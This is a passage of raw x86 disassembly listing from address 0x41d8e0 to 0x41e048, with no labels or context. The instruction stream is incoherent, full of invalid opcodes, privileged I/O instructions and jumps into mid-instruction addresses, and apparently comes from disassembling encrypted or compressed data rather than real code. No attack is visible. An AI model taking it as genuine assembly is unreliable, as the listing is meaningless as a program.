  41d8e0:	and    bl,BYTE PTR [eax-0x65]
  41d8e3:	sub    DWORD PTR [esi],edx
  41d8e5:	push   ebp
  41d8e6:	inc    ebp
  41d8e7:	cmp    BYTE PTR [edi],bh
  41d8e9:	loope  0x41d88e
  41d8eb:	xor    BYTE PTR [ecx-0x44],ah
  41d8ee:	loope  0x41d8b8
  41d8f0:	sub    ecx,esi
  41d8f2:	or     dh,bl
  41d8f4:	cmp    BYTE PTR [edx],ah
  41d8f6:	cmp    eax,DWORD PTR [ebx+ebx*1+0x72]
  41d8fa:	xor    DWORD PTR [esi+0x5124ef8d],edi
  41d900:	(bad)  [edi+0x7f18d1cf]
  41d906:	mov    bl,0xcd
  41d908:	pop    ds
  41d909:	mov    dh,0x6a
  41d90b:	dec    edi
  41d90c:	and    al,0x25
  41d90e:	test   al,0x2c
  41d910:	pusha  
  41d911:	jae    0x41d98f
  41d913:	cmp    edx,DWORD PTR [edx]
  41d915:	jl     0x41d8ad
  41d917:	iret   
  41d918:	xor    BYTE PTR [ebp+0x2c2166b8],ah
  41d91e:	inc    esi
  41d91f:	and    al,0xb6
  41d921:	push   edx
  41d922:	or     ebx,DWORD PTR [edi]
  41d924:	mov    cl,0x7c
  41d926:	je     0x41d920
  41d928:	enter  0xd26b,0xba
  41d92c:	cwde   
  41d92d:	jmp    0x2715:0x7ca1a1d7
  41d934:	fstp   DWORD PTR [edx-0x2f]
  41d937:	sub    edx,DWORD PTR [ebx-0x7d5c70a7]
  41d93d:	inc    esi
  41d93e:	retf   
  41d93f:	mov    ?,WORD PTR [esi+0x1a]
  41d942:	dec    esi
  41d943:	mov    BYTE PTR [esi],al
  41d945:	fwait
  41d946:	aam    0xd5
  41d948:	dec    eax
  41d949:	scas   al,BYTE PTR es:[edi]
  41d94a:	imul   ecx,DWORD PTR [ebp+ecx*1-0x3423ec1e],0xffffffb0
  41d952:	pop    ebp
  41d953:	gs sbb eax,0xed857421
  41d959:	sub    eax,0x1ed8078f
  41d95e:	add    al,BYTE PTR [ecx-0x4a4345c4]
  41d964:	pop    ebp
  41d965:	rcr    dl,0x63
  41d968:	pop    ebx
  41d969:	test   BYTE PTR [edi+0x8a0a53d],cl
  41d96f:	lea    ebx,[eax+0x36]
  41d972:	push   0x17
  41d974:	jno    0x41d99a
  41d976:	mov    esi,0x49384e62
  41d97b:	pop    ds
  41d97c:	inc    esp
  41d97d:	xchg   edi,eax
  41d97e:	mov    ds:0x567a9006,al
  41d983:	cmp    eax,0x9aacaf2
  41d988:	and    DWORD PTR [ecx-0x3f],ebp
  41d98b:	and    ecx,DWORD PTR [edi+0x6]
  41d98e:	enter  0x375b,0xce
  41d992:	inc    eax
  41d993:	push   es
  41d994:	cmp    eax,0xca201edf
  41d999:	mov    esi,0xac1ee6d
  41d99e:	mov    edx,0x620087d7
  41d9a3:	mov    al,BYTE PTR [edx]
  41d9a5:	test   al,0x83
  41d9a7:	popf   
  41d9a8:	es jo  0x41d93f
  41d9ab:	in     eax,dx
  41d9ac:	adc    BYTE PTR [ebx],ch
  41d9ae:	xor    al,0xc6
  41d9b0:	int3   
  41d9b1:	add    eax,0xd15fa133
  41d9b6:	mov    esi,0x4ade40ef
  41d9bb:	lahf   
  41d9bc:	mov    ds:0x8cf6dfe4,eax
  41d9c1:	inc    eax
  41d9c2:	jmp    DWORD PTR [eax-0x74a8c029]
  41d9c8:	mov    al,ds:0xd224da84
  41d9cd:	mov    dh,0x8e
  41d9cf:	sbb    ebp,DWORD PTR [edi-0x4f734c6a]
  41d9d5:	inc    ecx
  41d9d6:	ins    BYTE PTR es:[edi],dx
  41d9d7:	and    BYTE PTR [ecx],bl
  41d9d9:	ret    
  41d9da:	inc    ebp
  41d9db:	fnstenv [esi-0x2223f13b]
  41d9e1:	jbe    0x41d981
  41d9e3:	cmp    BYTE PTR [edx],bh
  41d9e5:	xchg   ebp,eax
  41d9e6:	aaa    
  41d9e7:	pop    ebp
  41d9e8:	outs   dx,DWORD PTR ds:[esi]
  41d9e9:	neg    BYTE PTR [esi]
  41d9eb:	push   esp
  41d9ec:	adc    eax,0x1d555678
  41d9f1:	(bad)  
  41d9f2:	cli    
  41d9f3:	xor    bl,BYTE PTR [eax+0x7]
  41d9f6:	retf   0xafc4
  41d9f9:	sti    
  41d9fa:	xor    BYTE PTR [ebx+eiz*4-0x5cb22ce1],dh
  41da01:	pop    esi
  41da02:	cmp    eax,0x102de786
  41da07:	gs das 
  41da09:	inc    ecx
  41da0a:	adc    al,0xe5
  41da0c:	pop    esp
  41da0d:	and    bl,0x32
  41da10:	cs inc edx
  41da12:	mov    WORD PTR [esi],es
  41da14:	jae    0x41da5a
  41da16:	scas   al,BYTE PTR es:[edi]
  41da17:	sbb    bh,BYTE PTR [ecx]
  41da19:	mov    al,BYTE PTR [ecx-0x7acd217f]
  41da1f:	inc    esp
  41da20:	add    DWORD PTR [edi-0x4a],ecx
  41da23:	mov    BYTE PTR [edx+0x5d],bh
  41da26:	pop    esi
  41da27:	out    dx,eax
  41da28:	fwait
  41da29:	and    eax,0x5b934ae7
  41da2e:	xor    esp,DWORD PTR [edi]
  41da30:	or     BYTE PTR [ebx],bh
  41da32:	or     ebp,DWORD PTR [eax+0x3efbd551]
  41da38:	jmp    0x4fa4d969
  41da3d:	pop    edx
  41da3e:	mov    dl,0x94
  41da40:	sbb    al,0x6c
  41da42:	jecxz  0x41d9d6
  41da44:	cmc    
  41da45:	push   ss
  41da46:	in     al,0xd2
  41da48:	or     BYTE PTR [esi+ecx*4+0x1b],bl
  41da4c:	xlat   BYTE PTR ds:[ebx]
  41da4d:	mov    ebx,0x76f04304
  41da52:	jbe    0x41da3c
  41da54:	(bad)  
  41da55:	mov    ah,0x9a
  41da57:	add    al,0xd6
  41da59:	sub    eax,0x2edb6cc7
  41da5e:	or     ebx,DWORD PTR [esi+0x4be82266]
  41da64:	repz imul esi,DWORD PTR [ebx+0x54],0x24
  41da69:	push   ds
  41da6a:	adc    eax,0x549246a6
  41da6f:	and    eax,0x94b16494
  41da74:	(bad)  
  41da75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da76:	retf   0xd074
  41da79:	push   edi
  41da7a:	push   ebp
  41da7b:	mov    ecx,0x8ba0199d
  41da80:	adc    eax,0x4ae55eef
  41da85:	leave  
  41da86:	cs dec ecx
  41da88:	cli    
  41da89:	mov    WORD PTR [eax-0x4b],es
  41da8c:	mov    ah,0x3d
  41da8e:	push   ebx
  41da8f:	sbb    BYTE PTR [eax-0x3c592545],bl
  41da95:	xchg   BYTE PTR [ecx-0x33344ab5],ah
  41da9b:	mov    es,WORD PTR [edx+ecx*1+0x63]
  41da9f:	jmp    0x41daf1
  41daa1:	repz cmp eax,0x8f8e7192
  41daa7:	jp     0x41db05
  41daa9:	ret    
  41daaa:	out    0x65,al
  41daac:	fstp   QWORD PTR [edx-0x2a]
  41daaf:	push   esp
  41dab0:	fisub  DWORD PTR [ebx]
  41dab2:	inc    ebx
  41dab3:	push   esi
  41dab4:	mov    esi,0x7a200085
  41dab9:	fstp   DWORD PTR [esi-0x33]
  41dabc:	stos   DWORD PTR es:[edi],eax
  41dabd:	push   0x38bf072b
  41dac2:	pop    edi
  41dac3:	imul   ebp,DWORD PTR [esi+0x20],0x6c
  41dac7:	ss push edx
  41dac9:	or     ecx,DWORD PTR [ecx]
  41dacb:	push   ebp
  41dacc:	(bad)  
  41dace:	fsub   DWORD PTR [esp+ebp*1]
  41dad1:	sub    al,0x49
  41dad3:	addr16 xor eax,0x2592fdcd
  41dad9:	push   es
  41dada:	cwde   
  41dadb:	jmp    0x41daa8
  41dadd:	pop    esp
  41dade:	out    dx,eax
  41dadf:	fwait
  41dae0:	and    DWORD PTR [edi-0x40],0xfffffff0
  41dae4:	or     al,0xeb
  41dae6:	push   esp
  41dae7:	sbb    dl,BYTE PTR [edx]
  41dae9:	push   ebx
  41daea:	add    DWORD PTR [esi+0x78],esp
  41daed:	xchg   edx,eax
  41daee:	jg     0x41da76
  41daf0:	mov    edx,0x4a1b77db
  41daf5:	leave  
  41daf6:	inc    edi
  41daf7:	lock cdq 
  41daf9:	pop    ss
  41dafa:	dec    ebp
  41dafb:	sub    DWORD PTR [eax],ebp
  41dafd:	xchg   DWORD PTR [edx+ebx*4-0x78],edx
  41db01:	popa   
  41db02:	in     eax,dx
  41db03:	mov    dl,0xa4
  41db05:	adc    DWORD PTR [eax+0x5e],ecx
  41db08:	stc    
  41db09:	xor    DWORD PTR [ecx-0x2bb4f252],ebp
  41db0f:	or     eax,0x1ced2845
  41db14:	(bad)  
  41db15:	enter  0xc3d7,0xdf
  41db19:	dec    ebp
  41db1a:	sub    ah,ch
  41db1c:	push   edx
  41db1d:	jle    0x41db43
  41db1f:	ror    BYTE PTR [ecx+ebx*1+0x46],0x72
  41db24:	(bad)  
  41db27:	cmp    eax,0xae20a689
  41db2c:	mov    DWORD PTR [ecx-0x7352694f],edi
  41db32:	cdq    
  41db33:	and    DWORD PTR [edx-0x1],0x137fccd6
  41db3a:	int    0x63
  41db3c:	mov    esp,0x99dd1b89
  41db41:	pop    ebx
  41db42:	stc    
  41db43:	pop    ecx
  41db44:	add    ch,BYTE PTR [edx+ecx*1]
  41db47:	addr16 enter 0x21c0,0xa2
  41db4c:	adc    ebp,DWORD PTR [edx+0x22]
  41db4f:	sahf   
  41db50:	ret    
  41db51:	sbb    dh,ah
  41db53:	push   es
  41db54:	into   
  41db55:	sar    DWORD PTR ds:0xd07dd46e,1
  41db5b:	dec    eax
  41db5c:	jno    0x41db7a
  41db5e:	push   ss
  41db5f:	mov    eax,ds:0xdf090a3a
  41db64:	xor    eax,0x19dba574
  41db69:	enter  0xb8ce,0x4c
  41db6d:	int3   
  41db6e:	mov    ebp,0x3e6c826a
  41db73:	mov    al,0xc4
  41db75:	pop    ds
  41db76:	push   edi
  41db77:	jg     0x41db4d
  41db79:	loopne 0x41db32
  41db7b:	push   ds
  41db7c:	hlt    
  41db7d:	cld    
  41db7e:	jge    0x41dbc5
  41db80:	daa    
  41db81:	xor    DWORD PTR [ecx+0x5e],ebp
  41db84:	not    BYTE PTR [edi+0x646abb7f]
  41db8a:	in     eax,0x88
  41db8c:	das    
  41db8d:	fs call 0xe1287917
  41db93:	mov    esp,DWORD PTR ds:0x26c5f5d7
  41db99:	dec    esp
  41db9a:	add    ebx,DWORD PTR [edi-0x63284e56]
  41dba0:	nop
  41dba1:	jno    0x41dbc3
  41dba3:	(bad)  
  41dba4:	repz stc 
  41dba6:	dec    esp
  41dba7:	add    ebp,DWORD PTR [eax]
  41dba9:	adc    eax,0xac8d2cf9
  41dbae:	xchg   edx,eax
  41dbaf:	test   BYTE PTR ds:0xb12586bc,bh
  41dbb5:	mov    cl,0x31
  41dbb7:	ins    DWORD PTR es:[edi],dx
  41dbb8:	fwait
  41dbb9:	dec    edi
  41dbba:	dec    esi
  41dbbb:	nop
  41dbbc:	fist   DWORD PTR [ebx+0x53]
  41dbbf:	cmp    ecx,DWORD PTR [edx-0x4b8a0bf3]
  41dbc5:	das    
  41dbc6:	pop    edx
  41dbc7:	test   ebx,ebp
  41dbc9:	arpl   si,bx
  41dbcb:	(bad)  [esp+edx*8+0x13]
  41dbcf:	rol    ah,0xa0
  41dbd2:	dec    ebx
  41dbd3:	adc    dl,ah
  41dbd5:	xchg   DWORD PTR [ecx+0x10],edx
  41dbd8:	add    edx,esi
  41dbda:	lods   al,BYTE PTR ds:[esi]
  41dbdb:	(bad)  
  41dbdc:	push   DWORD PTR [ebx]
  41dbde:	xor    cl,BYTE PTR [eax]
  41dbe0:	ret    
  41dbe1:	mov    dl,0xa6
  41dbe3:	stos   BYTE PTR es:[edi],al
  41dbe4:	push   ss
  41dbe5:	sub    BYTE PTR [eax],al
  41dbe7:	loope  0x41dbc5
  41dbe9:	sub    BYTE PTR [edi],bl
  41dbeb:	mov    ecx,0xf5ece66f
  41dbf0:	adc    BYTE PTR [edi+eax*1+0x6a],0xcd
  41dbf5:	(bad)  
  41dbf6:	(bad)  
  41dbf7:	repnz mov WORD PTR [esi],?
  41dbfa:	inc    esi
  41dbfb:	pop    ss
  41dbfc:	add    bh,cl
  41dbfe:	and    BYTE PTR [edx-0x5216361b],0x3b
  41dc05:	jb     0x41db95
  41dc07:	sbb    BYTE PTR [ebx-0x434859d8],0xb2
  41dc0e:	pop    eax
  41dc0f:	sti    
  41dc10:	jo     0x41dc90
  41dc12:	aam    0xe7
  41dc14:	xchg   edx,eax
  41dc15:	dec    ebx
  41dc16:	jb     0x41dbdc
  41dc18:	int3   
  41dc19:	ud0    edx,DWORD PTR [ecx+0x1f4e6e4e]
  41dc20:	mov    cl,0x40
  41dc22:	mov    eax,ds:0x8c95b031
  41dc27:	dec    ebx
  41dc28:	nop
  41dc29:	leave  
  41dc2a:	jb     0x41dc09
  41dc2c:	cwde   
  41dc2d:	mov    ebx,0x552d5484
  41dc32:	inc    esi
  41dc33:	and    DWORD PTR [ebx+0x4509c515],ebp
  41dc39:	pop    edx
  41dc3a:	xchg   ebp,eax
  41dc3b:	(bad)  
  41dc3d:	pop    ecx
  41dc3e:	sbb    DWORD PTR [edi-0x7a07b87f],ebp
  41dc44:	push   0x95f066cb
  41dc49:	fucomip st,st(3)
  41dc4b:	push   ecx
  41dc4c:	repnz popf 
  41dc4e:	int    0x33
  41dc50:	imul   ebx,DWORD PTR [eax-0x22],0x24030327
  41dc57:	sub    eax,0x1561acdc
  41dc5c:	sahf   
  41dc5d:	fadd   QWORD PTR [eax]
  41dc5f:	sub    ch,BYTE PTR [eax+0x4b5562d8]
  41dc65:	(bad)  
  41dc66:	dec    eax
  41dc67:	or     eax,0x4b9c449f
  41dc6c:	sbb    DWORD PTR [edx-0x79],0xffffffbe
  41dc70:	inc    ebp
  41dc71:	imul   edi,DWORD PTR [ecx-0x5b],0xfffffff9
  41dc75:	icebp  
  41dc76:	repz jecxz 0x41dcb1
  41dc79:	sbb    DWORD PTR [edx+0x12524dbd],esp
  41dc7f:	add    ah,BYTE PTR [ebp-0x50]
  41dc82:	xchg   ebp,eax
  41dc83:	push   cs
  41dc84:	sbb    BYTE PTR [ecx+eax*1],dh
  41dc87:	nop
  41dc88:	push   eax
  41dc89:	push   es
  41dc8a:	and    eax,0x949ca543
  41dc8f:	not    BYTE PTR [ebx+0x210cb759]
  41dc95:	ret    0x53d9
  41dc98:	repnz cld 
  41dc9a:	ret    
  41dc9b:	test   BYTE PTR [ebp+ecx*8-0x5b070584],0x78
  41dca3:	push   es
  41dca4:	xor    cl,al
  41dca6:	lods   al,BYTE PTR ds:[esi]
  41dca7:	jg     0x41dc69
  41dca9:	jnp    0x41dc50
  41dcab:	ror    DWORD PTR [eax+0x9],1
  41dcae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcaf:	(bad)  
  41dcb0:	cmp    BYTE PTR [ebp*1+0x734e478c],dl
  41dcb7:	ss jns 0x41dd06
  41dcba:	dec    BYTE PTR [edx-0x55]
  41dcbd:	or     DWORD PTR [ebx],edx
  41dcbf:	mov    ebp,0x8a47467f
  41dcc4:	pop    esp
  41dcc5:	add    ebx,edx
  41dcc7:	adc    BYTE PTR [bp+di+0x4f],al
  41dccb:	push   ds
  41dccc:	out    0x5a,al
  41dcce:	mov    dh,0x35
  41dcd0:	xor    DWORD PTR [ecx],esi
  41dcd2:	(bad)  [esp+edx*4]
  41dcd5:	into   
  41dcd6:	aad    0x16
  41dcd8:	inc    esi
  41dcd9:	ret    0x7cf
  41dcdc:	lds    eax,FWORD PTR [ecx+ecx*1]
  41dcdf:	loop   0x41dc64
  41dce1:	add    ah,BYTE PTR [ebx+0x32]
  41dce4:	cmp    edx,ecx
  41dce6:	fidiv  WORD PTR [esi-0x7f1f639a]
  41dcec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dced:	pop    es
  41dcee:	mov    esp,0x367a28c9
  41dcf3:	dec    ebx
  41dcf4:	push   ecx
  41dcf5:	aaa    
  41dcf6:	aaa    
  41dcf7:	ret    
  41dcf8:	ja     0x41dc7a
  41dcfa:	and    al,0x28
  41dcfc:	mov    ds:0x3fedaa29,eax
  41dd01:	data16 loop 0x41dc86
  41dd04:	cwde   
  41dd05:	int3   
  41dd06:	rol    BYTE PTR [ebx],1
  41dd08:	das    
  41dd09:	xchg   ecx,eax
  41dd0a:	ret    
  41dd0b:	imul   eax,DWORD PTR [ecx+0x78],0xffffff98
  41dd0f:	xchg   ebx,eax
  41dd10:	sub    al,0xd0
  41dd12:	add    dl,ch
  41dd14:	xor    ebx,DWORD PTR [edi*4+0x3687a54c]
  41dd1b:	mov    esp,0x4a1e1f49
  41dd20:	sbb    DWORD PTR [ebp+0x46],edx
  41dd23:	mov    esi,0xb553fa26
  41dd28:	mov    al,ds:0x13e44f3d
  41dd2d:	mov    bh,0xd
  41dd2f:	cmp    dl,bl
  41dd31:	dec    ebx
  41dd32:	inc    eax
  41dd33:	adc    edi,ebp
  41dd35:	sbb    ah,ch
  41dd37:	dec    ebp
  41dd38:	fimul  DWORD PTR [ebx-0x4]
  41dd3b:	sub    cl,BYTE PTR [ecx]
  41dd3d:	shl    BYTE PTR [edx+0x807fceb],1
  41dd43:	adc    DWORD PTR [eax-0x68],esi
  41dd46:	mov    eax,0x46e04951
  41dd4b:	cdq    
  41dd4c:	sub    eax,0x39f5454c
  41dd51:	xlat   BYTE PTR ds:[ebx]
  41dd52:	repz not DWORD PTR [ebx-0x67a07ca0]
  41dd59:	xchg   edi,eax
  41dd5a:	xor    al,0x65
  41dd5c:	sbb    esp,DWORD PTR [ecx-0x21743d9d]
  41dd62:	or     al,0xe2
  41dd64:	push   esp
  41dd65:	fwait
  41dd66:	cld    
  41dd67:	pop    esp
  41dd68:	adc    BYTE PTR [esi+0x59],cl
  41dd6b:	dec    ebx
  41dd6c:	jmp    FWORD PTR [ebx]
  41dd6e:	cvttps2pi mm3,QWORD PTR [eax-0x58]
  41dd72:	adc    esp,DWORD PTR [edi+edi*1+0x3]
  41dd76:	stos   DWORD PTR es:[edi],eax
  41dd77:	sbb    ch,BYTE PTR [ebx-0x67]
  41dd7a:	(bad)  
  41dd7b:	and    al,0xbe
  41dd7d:	popf   
  41dd7e:	ins    BYTE PTR es:[edi],dx
  41dd7f:	retf   
  41dd80:	adc    BYTE PTR [edi-0x3e],dl
  41dd83:	push   eax
  41dd84:	sbb    esp,esi
  41dd86:	xchg   edi,eax
  41dd87:	out    0x13,al
  41dd89:	out    0xee,al
  41dd8b:	retf   
  41dd8c:	pop    edi
  41dd8d:	push   edx
  41dd8e:	pop    ebx
  41dd8f:	rol    BYTE PTR [edx+eax*8+0x45],1
  41dd93:	mov    edi,0x2c828133
  41dd98:	push   ss
  41dd99:	adc    DWORD PTR [edx],eax
  41dd9b:	jns    0x41dd82
  41dd9d:	sub    DWORD PTR [edi-0x421d9193],ebp
  41dda3:	nop
  41dda4:	push   es
  41dda5:	jle    0x41dd81
  41dda7:	dec    esi
  41dda8:	fsubrp st(4),st
  41ddaa:	out    0x68,eax
  41ddac:	lods   eax,DWORD PTR ds:[esi]
  41ddad:	nop
  41ddae:	sub    eax,0x7d81e751
  41ddb3:	dec    esp
  41ddb4:	xchg   esp,eax
  41ddb5:	fiadd  WORD PTR [ebp+0x7c9d3dc]
  41ddbb:	jmp    0x2af8:0x68945c19
  41ddc2:	sahf   
  41ddc3:	lods   eax,DWORD PTR ds:[esi]
  41ddc4:	xor    esp,DWORD PTR [ecx*1+0x7156eb2a]
  41ddcb:	adc    BYTE PTR [eax-0x7a150cd5],0x12
  41ddd2:	inc    esi
  41ddd3:	mov    edi,0x930a4453
  41ddd8:	xchg   ebx,eax
  41ddd9:	pop    edx
  41ddda:	add    al,0xd7
  41dddc:	inc    ecx
  41dddd:	iret   
  41ddde:	mov    ds:0xbb226acf,al
  41dde3:	cld    
  41dde4:	and    BYTE PTR [esi+esi*8+0x73],dh
  41dde8:	lahf   
  41dde9:	push   edi
  41ddea:	inc    eax
  41ddeb:	adc    BYTE PTR [esi-0x38ab8848],bl
  41ddf1:	or     ch,BYTE PTR [esi]
  41ddf3:	mov    dl,0x75
  41ddf5:	in     al,dx
  41ddf6:	loop   0x41ddc4
  41ddf8:	adc    cl,0x0
  41ddfb:	inc    eax
  41ddfc:	ja     0x41dd92
  41ddfe:	in     al,dx
  41ddff:	dec    ecx
  41de00:	and    edi,DWORD PTR [esi]
  41de02:	mov    BYTE PTR [edx+0x347218a3],cl
  41de08:	leave  
  41de09:	call   0xd7fa7ee5
  41de0e:	psllq  mm2,0xb8
  41de12:	test   BYTE PTR [ecx],bh
  41de14:	(bad)  [edi]
  41de16:	outs   dx,DWORD PTR ds:[esi]
  41de17:	mul    BYTE PTR [eax]
  41de19:	pop    esi
  41de1a:	cdq    
  41de1b:	ret    0x2910
  41de1e:	icebp  
  41de1f:	retf   0x4fa7
  41de22:	mov    BYTE PTR [edi+0x7e],cl
  41de25:	push   ebp
  41de26:	stos   BYTE PTR es:[edi],al
  41de27:	jg     0x41dddd
  41de29:	jl     0x41de30
  41de2b:	mov    ah,0xa8
  41de2d:	inc    ebp
  41de2e:	push   0x4f3d117a
  41de33:	imul   DWORD PTR ds:0x1072d957
  41de39:	add    ecx,0xffffffb4
  41de3c:	or     edi,DWORD PTR [ebx]
  41de3e:	push   cs
  41de3f:	sub    dh,BYTE PTR [ebx+0x7fe093b5]
  41de45:	les    esp,FWORD PTR [esi+0xfb85895]
  41de4b:	(bad)  
  41de4c:	fisub  DWORD PTR [edi-0xb]
  41de4f:	daa    
  41de50:	xchg   esi,eax
  41de51:	or     edi,esp
  41de53:	jns    0x41dea7
  41de55:	fst    QWORD PTR [edi+0x18687893]
  41de5b:	mov    dh,bl
  41de5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de5e:	or     bl,BYTE PTR [ebx+0xb3f6fe3]
  41de64:	pusha  
  41de65:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de67:	mov    ebx,ebp
  41de69:	js     0x41de5e
  41de6b:	push   esi
  41de6c:	sbb    DWORD PTR ds:0x86ff08d0,esi
  41de72:	lods   eax,DWORD PTR ds:[esi]
  41de73:	push   ebp
  41de74:	pop    esp
  41de75:	mov    esi,0xe6d487ff
  41de7a:	imul   edx,esp,0x22cee2ba
  41de80:	ins    BYTE PTR es:[edi],dx
  41de81:	lahf   
  41de82:	dec    esp
  41de83:	out    0x6d,eax
  41de85:	into   
  41de86:	out    dx,eax
  41de87:	(bad)  
  41de88:	pop    edx
  41de89:	push   0x5e
  41de8b:	pop    edi
  41de8c:	loopne 0x41de5b
  41de8e:	in     al,dx
  41de8f:	jbe    0x41dea2
  41de91:	enter  0x1562,0x49
  41de95:	loopne 0x41defb
  41de97:	push   esi
  41de98:	mov    ebx,DWORD PTR [esp+ecx*2+0x47]
  41de9c:	lahf   
  41de9d:	mov    eax,ds:0x9ee0add1
  41dea2:	sahf   
  41dea3:	stos   BYTE PTR es:[edi],al
  41dea4:	mov    ch,0x50
  41dea6:	xchg   ebx,eax
  41dea7:	and    BYTE PTR es:[ebx+0x69],al
  41deab:	cs jp  0x41de39
  41deae:	push   ebp
  41deaf:	das    
  41deb0:	je     0x41de37
  41deb2:	lds    esi,FWORD PTR [ebp-0x20]
  41deb5:	sbb    ch,cl
  41deb7:	add    DWORD PTR [edi],ebp
  41deb9:	lods   eax,DWORD PTR ds:[esi]
  41deba:	inc    eax
  41debb:	mov    al,0x1a
  41debd:	(bad)
  41dec0:	push   0xb3080f1f
  41dec5:	stc    
  41dec6:	or     esp,DWORD PTR [ebp-0x16]
  41dec9:	stos   BYTE PTR es:[edi],al
  41deca:	ds cmc 
  41decc:	and    ah,BYTE PTR [ebx+esi*4+0x22]
  41ded0:	and    eax,0xe1028895
  41ded5:	mov    ah,0x7d
  41ded7:	inc    esp
  41ded8:	arpl   WORD PTR [edx-0x3e],sp
  41dedb:	dec    esp
  41dedc:	(bad)  
  41dedd:	push   esp
  41dede:	xor    bl,BYTE PTR [ecx-0x2f44f32a]
  41dee4:	dec    ebx
  41dee5:	ins    BYTE PTR es:[edi],dx
  41dee6:	int3   
  41dee7:	dec    ebp
  41dee8:	adc    DWORD PTR [ebx-0x54],eax
  41deeb:	dec    esi
  41deec:	fnstsw WORD PTR [edi+ebp*2]
  41deef:	push   ebp
  41def0:	lock cmp edi,DWORD PTR [edx+0x7a]
  41def4:	ins    DWORD PTR es:[edi],dx
  41def5:	les    ebp,FWORD PTR [esi]
  41def7:	arpl   WORD PTR cs:[ebx],ax
  41defa:	and    BYTE PTR [edi+0x4abcd010],dl
  41df00:	mov    al,ds:0x587e247c
  41df05:	xchg   esp,eax
  41df06:	jl     0x41deb4
  41df08:	pop    eax
  41df09:	aaa    
  41df0a:	jne    0x41df2d
  41df0c:	lea    ebx,[edx+0x6a0da71b]
  41df12:	cmp    al,0x85
  41df14:	sub    BYTE PTR [ebp+0x76],0x13
  41df18:	push   edi
  41df19:	cdq    
  41df1a:	iret   
  41df1b:	test   ah,ah
  41df1d:	mov    ds:0xbfbd5053,eax
  41df22:	rcl    DWORD PTR [ebp+0x2c836bd2],0xba
  41df29:	jb     0x41df4d
  41df2b:	addr16 jg 0x41def6
  41df2e:	sbb    bh,BYTE PTR [ebx]
  41df30:	adc    edi,DWORD PTR [ebx]
  41df32:	xchg   ecx,edx
  41df34:	test   BYTE PTR [edx+0x3d],ah
  41df37:	rcr    BYTE PTR [edx-0x23],0xca
  41df3b:	adc    ebx,DWORD PTR [esp+edi*1+0x59e376f1]
  41df42:	mov    esp,ebx
  41df44:	fstp   QWORD PTR [edi-0x6a766dbf]
  41df4a:	mov    ds:0x47498b87,eax
  41df4f:	push   ebp
  41df50:	adc    eax,0x26bcb701
  41df55:	sbb    BYTE PTR [ebp+0x680042f],0x9e
  41df5c:	lahf   
  41df5d:	dec    eax
  41df5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df5f:	cwde   
  41df60:	rcl    BYTE PTR [ebp-0x4f63336e],0x50
  41df67:	aaa    
  41df68:	aam    0x36
  41df6a:	add    ebx,DWORD PTR [ebp-0x2c1e999e]
  41df70:	inc    eax
  41df71:	ja     0x41dfb5
  41df73:	ins    DWORD PTR es:[edi],dx
  41df74:	cmp    DWORD PTR [esi+0x6c7952c3],edx
  41df7a:	scas   eax,DWORD PTR es:[edi]
  41df7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df7c:	sub    bh,BYTE PTR [esi]
  41df7e:	dec    esi
  41df7f:	mov    dh,0x3b
  41df81:	das    
  41df82:	push   ss
  41df83:	mov    bh,0x6b
  41df85:	hlt    
  41df86:	or     eax,0x7b76efd9
  41df8b:	jno    0x41dfbc
  41df8d:	or     DWORD PTR [eax+0x63],ecx
  41df90:	mov    eax,0x9b8d491b
  41df95:	addr16 jns 0x41dfdc
  41df98:	mov    edx,0x65a4d7bd
  41df9d:	sbb    eax,DWORD PTR [edi]
  41df9f:	mov    bl,BYTE PTR [esi-0x4a]
  41dfa2:	inc    eax
  41dfa3:	shl    al,0xfd
  41dfa6:	clc    
  41dfa7:	add    bl,BYTE PTR [ebp-0x2e]
  41dfaa:	not    BYTE PTR [edx+ecx*1+0x58]
  41dfae:	into   
  41dfaf:	daa    
  41dfb0:	popf   
  41dfb1:	jno    0x41dfdd
  41dfb3:	mov    ch,0x9a
  41dfb5:	or     eax,0x3271c20c
  41dfba:	fmul   DWORD PTR [esi-0x5b1f4f5c]
  41dfc0:	mov    dl,0xf0
  41dfc2:	pop    es
  41dfc3:	mov    WORD PTR [esi+0x4e],es
  41dfc6:	or     al,0xac
  41dfc8:	mov    al,0xf7
  41dfca:	pusha  
  41dfcb:	and    cl,BYTE PTR [edi-0x1e]
  41dfce:	mov    ah,0x2
  41dfd0:	sahf   
  41dfd1:	cmp    al,0x50
  41dfd3:	sbb    eax,0x28481a3c
  41dfd8:	es loopne 0x41dfa4
  41dfdb:	xlat   BYTE PTR ds:[ebx]
  41dfdc:	xchg   ebx,eax
  41dfdd:	fcomp  QWORD PTR [edi]
  41dfdf:	out    0xb0,al
  41dfe1:	aas    
  41dfe2:	nop
  41dfe3:	sbb    edi,ebx
  41dfe5:	aaa    
  41dfe6:	jno    0x41dfe5
  41dfe8:	arpl   WORD PTR [edi],bp
  41dfea:	repz inc esp
  41dfec:	clc    
  41dfed:	fpatan 
  41dfef:	sbb    edx,ebx
  41dff1:	in     eax,0x45
  41dff3:	aas    
  41dff4:	lock fcmovnbe st,st(5)
  41dff7:	ins    DWORD PTR es:[edi],dx
  41dff8:	adc    eax,0x59934c17
  41dffd:	sub    ah,ch
  41dfff:	popf   
  41e000:	jle    0x41dfe1
  41e002:	and    ebp,DWORD PTR [eax-0x4a]
  41e005:	xor    dl,BYTE PTR [edi+0x7f72a65f]
  41e00b:	test   eax,0x1674d998
  41e010:	jnp    0x41e045
  41e012:	xor    al,dl
  41e014:	sahf   
  41e015:	jne    0x41dfff
  41e017:	daa    
  41e018:	out    0x67,al
  41e01a:	icebp  
  41e01b:	test   eax,0x7cd20e9f
  41e020:	mov    ebp,0x4c33bcfe
  41e025:	push   esi
  41e026:	shr    DWORD PTR [ecx-0x608b5a6a],0x2d
  41e02d:	sub    BYTE PTR [edi-0x6c2ecc8d],0x5
  41e034:	mov    al,0x48
  41e036:	push   ecx
  41e037:	push   edi
  41e038:	xchg   ebp,eax
  41e039:	in     al,dx
  41e03a:	jmp    0x41e0b7
  41e03c:	sti    
  41e03d:	sub    edi,0x899dc582
  41e043:	arpl   WORD PTR [ecx+edx*8+0x3c],ax
  41e047:	daa    
  41e048:	in     eax,dx
